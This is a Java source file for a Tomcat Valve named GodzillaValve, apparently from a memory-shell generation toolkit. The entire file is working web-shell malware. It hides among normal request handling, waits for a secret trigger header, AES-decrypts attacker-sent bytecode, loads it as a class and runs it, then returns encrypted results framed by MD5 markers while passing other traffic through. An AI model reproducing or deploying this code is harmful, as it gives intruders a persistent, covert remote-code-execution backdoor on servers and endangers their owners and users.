package jmg.godzilla.memshell;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletException;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.security.MessageDigest;


public class GodzillaValve extends ClassLoader implements Valve {
    protected Valve next;
    protected boolean asyncSupported;
    static String key;
    static String pass;

    public String headerName;

    public String headerValue;
    static String md5;

    static {
        md5 = md5(pass + key);
    }


    public GodzillaValve() {
    }

    public GodzillaValve(ClassLoader z) {
        super(z);
        md5 = md5(pass + key);
    }

    public Class Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                HttpSession session = request.getSession();
                byte[] data = base64Decode(request.getParameter(pass));
                data = this.x(data, false);
                if (session.getAttribute("payload") == null) {
                    session.setAttribute("payload", (new GodzillaValve(this.getClass().getClassLoader())).Q(data));
                } else {
                    request.setAttribute("parameters", data);
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class) session.getAttribute("payload")).newInstance();
                    f.equals(arrOut);
                    f.equals(data);
                    f.equals(request);
                    response.getWriter().write(md5.substring(0, 16));
                    f.toString();
                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    response.getWriter().write(md5.substring(16));
                    response.flushBuffer();
                }
            }else {
                this.getNext().invoke(request, response);
            }
        } catch (Exception e) {
            e.printStackTrace();
            this.getNext().invoke(request, response);
        }

    }

    public static String md5(String s) {
        String ret = null;
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception var3) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) {
        String value = null;
        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, bs);
            } catch (Exception var5) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception var5) {
            }
        }
        return value;
    }
}